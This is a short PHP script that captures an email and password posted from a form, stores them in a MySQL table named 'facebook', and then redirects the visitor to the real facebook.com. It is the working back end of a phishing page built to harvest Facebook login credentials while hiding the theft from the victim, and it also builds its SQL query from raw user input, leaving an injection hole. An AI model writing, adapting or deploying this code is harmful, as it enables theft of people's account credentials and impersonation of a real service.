<?php
$email=$_POST['email'];
$pass=$_POST['pass'];
$conn=mysqli_connect('localhost','pawan','')or die("Failed");

mysqli_select_db($conn,'facebook');
$sql="INSERT INTO facebook (email,pass) VALUES ('$email','$pass')";
if(mysqli_query($conn,$sql))
{
	header("Location:https://facebook.com");

}
else
	echo "error";
?>
